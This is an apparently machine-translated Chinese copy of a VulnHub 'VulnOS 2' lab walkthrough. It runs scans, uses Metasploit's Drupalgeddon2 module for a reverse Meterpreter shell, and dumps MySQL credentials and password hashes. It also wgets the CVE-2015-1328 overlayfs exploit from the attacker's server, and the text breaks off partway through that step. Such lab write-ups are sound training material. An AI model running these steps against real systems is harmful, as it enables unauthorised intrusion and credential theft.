<html>
<head>
<title>Vulnhub: VulnOS 2 Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnhub: VulnOS 2演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/vulnhub-vulnos-2-walkthrough-7ca0b9db013f?source=collection_archive---------0-----------------------#2022-01-05">https://infosecwriteups.com/vulnhub-vulnos-2-walkthrough-7ca0b9db013f?source=collection_archive---------0-----------------------#2022-01-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="458d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿，各位，这里有一个来自<strong class="jp ir">vulnhub<em class="kl">VulnOS 2</em></strong><em class="kl">的盒子的特写。我在5个月前写了这篇文章，我很想分享我的笔记(那时候我是怎么写的)。我今天会发表vulnhub的所有评论。你可以从这里下载这个盒子，</em></p><div class="km kn gp gr ko kp"><a href="https://www.vulnhub.com/entry/vulnos-2,147/" rel="noopener  ugc nofollow" target="_blank"><div class="kq ab fo"><div class="kr ab ks cl cj kt"><h2 class="bd ir gy z fp ku fr fs kv fu fw ip bi translated">武尔诺斯:2</h2><div class="kw l"><h3 class="bd b gy z fp ku fr fs kv fu fw dk translated">该网站使用“cookies”为您提供最佳、最相关的体验。使用这个网站意味着你对…</h3></div><div class="kx l"><p class="bd b dl z fp ku fr fs kv fu fw dk translated">www.vulnhub.com</p></div></div><div class="ky l"><div class="kz l la lb lc ky ld le kp"/></div></div></a></div><p id="26b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">扫描网络</strong></p><p id="a5cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lf lg lh li b">netdiscover</code>我们将找出机器的IP地址</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="1ae1" class="lr ls iq li b gy lt lu l lv lw">sudo netdiscover -r 10.0.2.0/24</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/1ee6df848f00d4f58d2c42e1813adfac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*M5QUiWR1csIkNmBw-l-SsQ.png"/></div></figure><p id="22bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道了机器的IP地址，我们可能想知道哪些端口是打开的，服务正在运行，等等，我们将通过nmap实现这一点，我们将把输出保存在<strong class="jp ir"> nmap.txt </strong>中。</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="78c2" class="lr ls iq li b gy lt lu l lv lw">sudo nmap -A -T4 -p- 10.0.2.74 -oN nmap_scan</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/cd6168540b779d7e4d2380be6d63efcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*-IKQj1GO-7DTEklhfUpFZg.png"/></div></figure><p id="913f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到有3个端口是开放的，即22 (SSH)、80 (http)、6667 (irc)。</p><p id="8e76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们先来看看网站上运行的是什么技术，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="7638" class="lr ls iq li b gy lt lu l lv lw">whatweb http://10.0.2.74</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/5881f4c05d941a68c85f70e0a07012ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XQNVz3j88LQtTjkmpr4uhg.png"/></div></div></figure><p id="04c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没什么！！</p><p id="04cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们访问网站<a class="ae mg" href="http://10.0.2.74/" rel="noopener ugc nofollow" target="_blank"> http://10.0.2.74 </a>，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/33b134cfb365deb05105ff3b7a8f0282.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w_HcC_JmqLW1ASOJosB_Ww.png"/></div></div></figure><p id="69fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个超链接，让我们跟着它走，</p><p id="aca4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们进入了新的网站<a class="ae mg" href="http://10.0.2.74/jabc/" rel="noopener ugc nofollow" target="_blank"> http://10.0.2.74/jabc/ </a>，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mh"><img src="../Images/6914f9532b877e6a232dc5f643f4603b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FpT_AOYjVFtGrPrUopZ3sg.png"/></div></div></figure><p id="66bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们来看看机器上运行的是什么技术，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="051d" class="lr ls iq li b gy lt lu l lv lw">whatweb http://10.0.2.74/jabc</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/80c26d573ee2577e8b389bed0bbebd7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X5qoZVdnKt6SLhPDmY0I3g.png"/></div></div></figure><p id="32d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个网站运行的是<strong class="jp ir"> Drupal软件v7 </strong>。</p><p id="3fd2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们运行nikto扫描，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="eced" class="lr ls iq li b gy lt lu l lv lw">nitko --host http://10.0.2.74/jabc --output nikto.txt</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mj"><img src="../Images/440d57263490314bdeaefd23f9580afa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wRKB9IPTdPypj1EDJaqfCw.png"/></div></div></figure><p id="7edb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个<strong class="jp ir"> robots.txt </strong>文件。</p><p id="94f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在继续之前，让我们也对目录进行暴力破解，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="ac67" class="lr ls iq li b gy lt lu l lv lw">python3 /home/kali/dirsearch/dirsearch.py -u http://10.0.2.74/jabc -e txt,php -i 200,301 -o dirsearch_scan</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/7789ebc3951ed9383e8a4b927e1a3d20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*QfcTQGqdysN5npMSkpzn_A.png"/></div></figure><p id="681d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有很多目录和文件！！</p><p id="bad5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们从robots.txt文件开始，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/658e312116396bcc0eb5928b74360e53.png" data-original-src="https://miro.medium.com/v2/resize:fit:580/format:webp/1*9Vqf-5kG4fFvez0sXvEZ_A.png"/></div></figure><p id="f8df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该文件不允许许多文件和目录。</p><p id="c86a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">万一你不知道robots.txt文件是什么，它是做什么的，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="1ba2" class="lr ls iq li b gy lt lu l lv lw">This file is to prevent the crawling and indexing of certain parts<br/># of your site by web crawlers and spiders run by sites like Yahoo!<br/># and Google. By telling these "robots" where not to go on your site,<br/># you save bandwidth and server resources.<br/>#<br/># This file will be ignored unless it is at the root of your host:<br/># Used:    <a class="ae mg" href="http://example.com/robots.txt" rel="noopener ugc nofollow" target="_blank">http://example.com/robots.txt</a><br/># Ignored: <a class="ae mg" href="http://example.com/site/robots.txt" rel="noopener ugc nofollow" target="_blank">http://example.com/site/robots.txt</a><br/>#<br/># For more information about the robots.txt standard, see:<br/># <a class="ae mg" href="http://www.robotstxt.org/wc/robots.html" rel="noopener ugc nofollow" target="_blank">http://www.robotstxt.org/wc/robots.html</a><br/>#<br/># For syntax checking, see:<br/># <a class="ae mg" href="http://www.sxw.org.uk/computing/robots/check.html" rel="noopener ugc nofollow" target="_blank">http://www.sxw.org.uk/computing/robots/check.html</a></span></pre><p id="afff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(在看到包含robots.txt文件解释的blob后，我被逗乐了)</p><p id="36b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:通常在<strong class="jp ir">config.php</strong>文件中有凭证，所以如果它存在，我们将立即获得凭证。</p><p id="54bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但由于这个盒子运行在Drupal v7软件上，让我们搜索它的漏洞(研究)，经过研究我发现漏洞名称是<strong class="jp ir"> Drupalgeddon </strong>，所以让我们寻找这个漏洞，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="ae0f" class="lr ls iq li b gy lt lu l lv lw">searchsploit drupalgeddon</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mm"><img src="../Images/8ad568e8ef85fc92b399f6419ede165f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OZG9pq2q6Jtmpxys9HS5HQ.png"/></div></div></figure><p id="0817" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个metasploit模块。让我们使用它。</p><p id="0093" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行<code class="fe lf lg lh li b">msfconsole -q</code>运行metasploit-framework并搜索drupalgeddon模块，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="86cc" class="lr ls iq li b gy lt lu l lv lw">search drupalgeddon</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/22dd1c5fa52229f3f5bceb6a817adcee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Sugs8BW3TjNaLd6BlE2Qhw.png"/></div></div></figure><p id="ddf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将使用这个模块。快跑，</p><p id="71c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将加载这个模块，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="a09a" class="lr ls iq li b gy lt lu l lv lw">use exploit/unix/webapp/drupal_drupalgeddon2</span></pre><p id="ff66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后设置选项，</p><ul class=""><li id="a3c6" class="mn mo iq jp b jq jr ju jv jy mp kc mq kg mr kk ms mt mu mv bi translated"><strong class="jp ir">设定rhosts 10.0.2.74 </strong></li><li id="d933" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><strong class="jp ir">设置lhost 10.0.2.15 </strong></li><li id="cdc8" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><strong class="jp ir">设置lport 4444 </strong></li><li id="f439" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><strong class="jp ir">设置r端口80 </strong></li><li id="b481" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><strong class="jp ir">设置targeturi /jabc/ </strong></li></ul><p id="24b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们交叉检查一下我们是否把所有事情都做对了，<code class="fe lf lg lh li b">options</code></p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nb"><img src="../Images/457299e1874eae0268de6f759304e058.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f-F1aOzJnDse-FniAwflBg.png"/></div></div></figure><p id="e2e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们现在<code class="fe lf lg lh li b">run</code>这个模块，看看会发生什么，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/d994b5c05b49792fd3a90246eff5f832.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*6YY6io2B_sZw6G-T9b20eA.png"/></div></figure><p id="af19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个测试会议。</p><p id="a691" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们首先通过在meterpreter shell中运行这个命令来了解系统信息，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="69a4" class="lr ls iq li b gy lt lu l lv lw">sysinfo</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/3bdd2484e752a4997e8e8e94d301f00b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*yIY8bGxt-MSgIqtjuLCflQ.png"/></div></figure><p id="d3cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一台linux机器(我已经知道了，XD)</p><p id="54e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们用<code class="fe lf lg lh li b">shell</code>命令得到一个shell，我们将得到一个简单的shell，但是我们将改进它的功能，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="43a5" class="lr ls iq li b gy lt lu l lv lw">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/1170f3bf9af892c8c2088460cae8bc77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*OsgMyda627J-ga-JXhpNZQ.png"/></div></figure><p id="785c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们知道我们有一个网络外壳。因此，我们必须找到用户的凭证，以便我们可以SSH一个用户。</p><p id="ca3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lf lg lh li b">ls</code>建立目录内容，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/a00811c2f2e052736dcc73aaa45ede2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*tkkNbIA2rT44SPqMpgpvzA.png"/></div></figure><p id="eb92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有许多文件，但是这些文件里什么也没有。</p><p id="f44e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到上一个目录，我们得到了另一个名为<strong class="jp ir"> jabcd0cs </strong>的目录，让我们导航到它，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/bd1ec5065a9165a40db4a56cc409c7c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:994/format:webp/1*9VSdOHDLkMQ4a25vlaHw-w.png"/></div></figure><p id="49b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lf lg lh li b">ls</code>建立内容，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nf"><img src="../Images/b7abf9048597e9bc52aa10bc72ec5278.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5Md5Z7KmoOxvTeEKZVRcRQ.png"/></div></div></figure><p id="2ac3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一份config.php的档案。让我们<code class="fe lf lg lh li b">cat</code>出它的内容，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="4df4" class="lr ls iq li b gy lt lu l lv lw">cat config.php</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ng"><img src="../Images/981b66426996adf82ed175518c5362a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1388/format:webp/1*Vp5xQoRAoCIuNlgkq89xoA.png"/></div></div></figure><p id="1037" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了mysql凭证。下面我们连线<strong class="jp ir"> mysql db </strong>！</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="45c6" class="lr ls iq li b gy lt lu l lv lw">mysql -u root -p</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/f4addb1d17d382361615bbe2bd8881fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*-FbdD3ypRwaB-ot6oh6Nvg.png"/></div></figure><p id="c7af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输入密码后，我们将连接到mysql数据库。</p><p id="e685" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们执行一个查询来列出所有数据库，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="2c7d" class="lr ls iq li b gy lt lu l lv lw">show databases;</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/6a3bedc1d926f7298c76364c6c22fe44.png" data-original-src="https://miro.medium.com/v2/resize:fit:550/format:webp/1*vYQLXpv9c2opRpZYy1k9Ug.png"/></div></figure><p id="98c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">jabcd0cs 数据库似乎很有趣。让我们使用它！</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="b187" class="lr ls iq li b gy lt lu l lv lw">use jabcd0cs;</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/65daaab7114b6809bf7f44a2d4ceee8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:458/format:webp/1*cxXwW1ExLKBE_ZGStfG99A.png"/></div></figure><p id="4d58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们验证一下我们是否使用了正确的数据库，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="072f" class="lr ls iq li b gy lt lu l lv lw">select database();</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/aa70205e34c52cae0305b93b5f745007.png" data-original-src="https://miro.medium.com/v2/resize:fit:566/format:webp/1*D_ZToFSmbmI2_9wLj7gZYQ.png"/></div></figure><p id="48e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的我们。现在，让我们列出这个数据库中的表，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="a88a" class="lr ls iq li b gy lt lu l lv lw">show tables;</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/91cd8d0f1eaf4d75bddfb8b62bc0d2f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:564/format:webp/1*SWxQgVluX_vRB3sWj8pNrA.png"/></div></figure><p id="e5ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个<strong class="jp ir"> odm_user </strong>表。这张桌子看起来很奇怪。让我们来看看这个表的内容，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="256d" class="lr ls iq li b gy lt lu l lv lw">describe odm_user;</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/c14220bad2712bfe15ab7f30b4efd9eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*NqiTzQWI9SE8QbcFaDOPhA.png"/></div></figure><p id="9315" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们所看到的，这个表中有用户名和密码(这就是我们要找的！！)，我们来查询一下他们，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="1932" class="lr ls iq li b gy lt lu l lv lw">select * from odm_user;</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/359c505eb040bfe4261ad9f5bf14c964.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wAkpEcKl8K3OD1-j8noNeQ.png"/></div></div></figure><p id="03b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了<strong class="jp ir"> webmin </strong>和<strong class="jp ir"> guest </strong>用户名以及他们的密码散列。让我们通过访问<a class="ae mg" href="https://www.md5online.org/md5-decrypt.html" rel="noopener ugc nofollow" target="_blank">https://www.md5online.org/md5-decrypt.html</a>来破解webmin用户密码哈希</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="0ebc" class="lr ls iq li b gy lt lu l lv lw">#show databases;  /querying with DB to show all databases<br/>#use [database];  /use particular database<br/>#select database();  /Determine what database is in use<br/>#show tables;   /show all tables in particular database<br/>#describe table;  /Show table structure<br/>#select * from table; /Selecting records from table</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/07be5ca264bd9b7969dfd40b0726613b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*UTUNTBsx_xqdRz5D9xVsbA.png"/></div></figure><p id="6674" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了破解密码！！让我们通过SSH作为webmin用户登录，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="028a" class="lr ls iq li b gy lt lu l lv lw">ssh webmin@10.0.2.74</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/a6419e5130fc5885915db70601f873d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*BfTzls5hdw5byC766soASg.png"/></div></div></figure><p id="7462" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们获得了webmin用户的访问权限！让我们找一个合适的贝壳，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="2dd5" class="lr ls iq li b gy lt lu l lv lw">/bin/bash -i</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/0b7bd1c24280d337908873f2a59a1dd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*SydZVedHMGbh7yQYYocj3A.png"/></div></figure><p id="9774" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在列举了一点之后，我发现我们可以在这一点上做<strong class="jp ir">特权提升</strong>。</p><p id="0598" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看一下系统信息，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="6fbb" class="lr ls iq li b gy lt lu l lv lw">uname -a</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi no"><img src="../Images/0b3acc9b0e5f742c2b4373bfef7eb2d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2MFect2V_Hohci2CJdfiVA.png"/></div></div></figure><p id="ddf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">做了一点研究后，我发现了这个版本内核的<strong class="jp ir">内核漏洞</strong>，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/18661c1b00992c242d803971deccd569.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pKuFTi_v8iMiUmfDyf42tg.png"/></div></div></figure><p id="c31c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">CVE-2015–1328:Linux内核3 . 13 . 0&lt;3.19(Ubuntu 12.04/14.04/14.10/15.04)——‘overlayfs’本地权限提升</strong></p><p id="8046" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将在我们的机器上下载这个漏洞，然后将其转移到远程机器上，但在转移之前，启动python服务器，通过<code class="fe lf lg lh li b">python3 -m http.server</code>在远程机器上提供文件，现在我们将在远程机器上转移这个漏洞。</p><p id="e34f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，让我们导航到<strong class="jp ir"> /tmp </strong>目录，然后在远程机器上下载这个漏洞，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="b210" class="lr ls iq li b gy lt lu l lv lw">wget http://10.0.2.15:8000/overlayfs.c</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mm"><img src="../Images/507eeeef7d9ba63fd9159e2227f583ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OcaGgf3ra4r-ZDZj7fVQ9A.png"/></div></div></figure><p id="2c6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在远程机器上下载漏洞后，我们将在我们的python服务器上获得连接请求，这意味着下载成功，</p><figure class="lj lk ll lm gt ly gh gi 